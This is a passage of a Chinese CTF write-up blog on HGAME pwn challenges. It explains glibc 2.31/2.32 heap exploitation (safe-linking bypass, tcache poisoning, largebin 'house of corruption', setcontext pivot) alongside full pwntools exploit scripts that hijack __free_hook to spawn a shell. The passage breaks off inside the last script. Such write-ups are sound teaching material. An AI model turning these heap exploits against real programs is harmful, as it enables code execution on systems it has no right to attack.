class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30439</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">&#x27;protectt&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xa0</span>,p64(free_hook)*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(system))</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h2><h3 id="libc-2-32预备知识"><a href="#libc-2-32预备知识" class="headerlink" title="libc-2.32预备知识"></a>libc-2.32预备知识</h3><ul><li>引入了<code>-safe-linking(异或加密)</code>机制，其核心思想是：将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或，该操作在堆块<strong>进入和退出</strong><code>tcache bin</code>时进行：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><ul><li><code>chunk</code>放入<code>tcache bin</code>时，其<code>fd</code>指针会进行<code>异或加密</code>，其<code>bk</code>指针会放入<code>tcache</code>，以防<code>double free</code>。</li><li><code>chunk</code>从<code>tcache bin</code>被取出时，其<code>fd</code>指针进行<code>反异或操作</code>，其<code>bk</code>指针清零。</li><li>以下图为例了解<code>-safe-linking</code>：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png" style="zoom:80%;" /><ul><li>当第一个<code>chunk</code>进入<code>tcache bin</code>时，由于<code>tcache</code>此时为空，故<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0</code>。</li><li>当第二个<code>chunk</code>进入<code>tcache bin</code>时，<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0x559f965652a0</code>。</li><li>第三个同理：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x559f96565&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f965652a0</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf37c5&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965653c0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f96565330</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf3655&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>不难想到<code>(0x559f965652a0 &gt;&gt; 12)</code>就是第一次<code>free chunk</code>的<code>fd</code>指针，一直参与异或，这也是有些师傅们常说的<code>key</code>。</li></ul><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe_note"></a>safe_note</h3><p><code>libc-2.32</code>环境下带有<code>edit</code>功能的<code>uaf</code>漏洞题目，除了环境不同，其余功能均与<code>WEEK2-pwn-editable_note</code>一致。</p><ul><li>申请9个<code>0x80</code>大小堆块，释放7个装满<code>tcache bin</code>，再释放一个进入<code>unsorted bin</code>，泄露<code>libc_base</code>即可。<strong>注：puts函数可能被低位‘\x00’截断，可以用edit进行调整。</strong></li><li>泄露第一个<code>free chunk</code>的<code>fd</code>指针即<code>key</code>，将<code>key</code>与<code>__free_hook</code>异或，加密结果在取出时便会得到真实的<code>__free_hook</code>地址。</li><li>修改第七个<code>free_chunk</code>的<code>fd</code>指针为<code>__free_hook</code>加密结果，再申请两次堆块得到<code>__free_hook</code>地址的控制权，写入<code>system</code>即可。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30852</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12</span>-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">bd=free_hook^key</span><br><span class="line">edit(<span class="number">6</span>,p64(bd))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="large-note"><a href="#large-note" class="headerlink" title="large_note"></a>large_note</h3><p><code>uaf</code>题型，涉及<code>libc2.32</code>下的<code>house of corruption</code>利用，主要适用于申请<code>largebin</code>大小的<code>chunk</code>题型，利用<code>house of corruption</code>可以改大一个已知地址。</p><blockquote><p><a href="https://www.anquanke.com/post/id/244018#h2-0">参考博客</a></p></blockquote><p>该题中<code>add</code>堆块的范围在<code>0x500 ~ 0x900</code>之间，释放的堆块无法进入<code>tcache</code>：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png" style="zoom: 80%;" /><p>用于利用实现<code>house of corruption</code>的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请一个<code>0x520</code>大小的堆块，再申请一个<code>0x500</code>大小的堆块避免合并，再申请一个<code>0x510</code>大小的堆块用于后续触发上述代码（需小于第一个堆块）。</li><li>释放掉第一个堆块并泄露<code>libc基址</code>，其进入<code>unsortedbin</code>，如果下一个申请的堆块大于<code>0x520</code>，则位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，否则被切割利用。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png" style="zoom:80%;" /><ul><li>因此申请一个<code>0x600（必须大于0x520）</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png" style="zoom:80%;" /><ul><li>修改<code>largebin chunk</code>的<code>bk-&gt;nextsize</code>为目标地址<code>target-0x20</code>，此处我们的<code>target</code>选择<code>mp_+80</code>即存储<code>tcachebin</code>数量的地址，初试为<code>64</code>，涵盖<code>0x10 ~ 0x400</code>，我们要将其改成一个大值。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png" style="zoom:80%;" /><ul><li>释放第三个堆块，其进入<code>unsortedbin</code>，故技重施再申请一个<code>0x600</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，触发<code>house of corruption</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png" style="zoom:80%;" /><ul><li>此时再释放的堆块都会进入<code>tcachebin</code>，利用<code>double free</code>完成对<code>__free_hook</code>的劫持即可。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png" style="zoom:80%;" /><ul><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=lb+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>相比于上题开了沙箱黑名单，禁用了<code>execve</code>。<code>rdi</code>转<code>rdx</code>后<code>setcontext+61</code>一把梭：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdi2rdx</span></span><br><span class="line">.text:<span class="number">000000000014B</span>760 <span class="number">48</span> <span class="number">8B</span> <span class="number">57</span> <span class="number">08</span>                   mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000014B</span>764 <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                   mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">.text:<span class="number">000000000014B</span>768 FF <span class="number">52</span> <span class="number">20</span>                      call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setcontext+61</span></span><br><span class="line">.text:<span class="number">000000000005306</span>D <span class="number">48</span> <span class="number">8B</span> A2 A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">9</span>A <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">6</span>A <span class="number">78</span>                   mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">62</span> <span class="number">48</span>                   mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">6</span>A <span class="number">50</span>                   mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">72</span> <span class="number">58</span>                   mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">7</span>A <span class="number">60</span>                   mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">64</span> F7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>+test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">000000000005309B</span> <span class="number">0F</span> <span class="number">84</span> B5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_53156</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000000053156</span>                               loc_53156:                              ; CODE XREF: setcontext+<span class="number">6B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000053156</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D <span class="number">51</span>                            push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">72</span> <span class="number">70</span>                   mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">7</span>A <span class="number">68</span>                   mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D <span class="number">4</span>C <span class="number">8B</span> <span class="number">42</span> <span class="number">28</span>                   mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">4</span>A <span class="number">30</span>                   mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                               ; &#125; <span class="comment">// starts at 53030</span></span><br><span class="line">.text:<span class="number">000000000005317</span>C                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000005317</span>C <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000005317</span>E C3                            retn</span><br></pre></td></tr></table></figure><ul><li>需要注意的是，若调用<code>open</code>函数报错，可以尝试<code>pop_rax_ret</code>+<code>syscall</code>进行系统调用。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 